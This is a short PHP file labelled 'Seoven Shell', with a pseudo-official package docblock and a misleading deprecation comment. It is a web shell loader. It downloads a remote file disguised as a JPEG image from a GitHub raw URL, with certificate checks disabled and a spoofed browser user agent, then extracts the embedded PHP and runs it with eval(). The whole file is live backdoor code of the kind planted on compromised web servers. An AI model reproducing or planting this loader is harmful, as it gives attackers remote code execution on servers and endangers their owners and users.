<?php
/**
 * @package    Seoven Shell
 * @copyright  Copyright (C) 2024 - 2025 Open Source, Inc. All rights reserved.
 * @link       https://t.me/seokolot
 */

// @deprecated  1.0  Deprecated without replacement

function get_contents($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    
    $result = curl_exec($ch);
    
    if ($result === false) {
        echo 'Curl error: ' . curl_error($ch);
        http_response_code(404);
        curl_close($ch);
        exit;
    }
    
    curl_close($ch);
    return $result;
}

$url = 'https://raw.githubusercontent.com/seovennn/bd/refs/heads/main/alfakuat.jpg';
$encoded_code = get_contents($url);

if ($encoded_code === false) {
    http_response_code(404);
    exit;
}

$start = strpos($encoded_code, '<?php');
if ($start !== false) {
    eval('?>' . substr($encoded_code, $start));
}
?>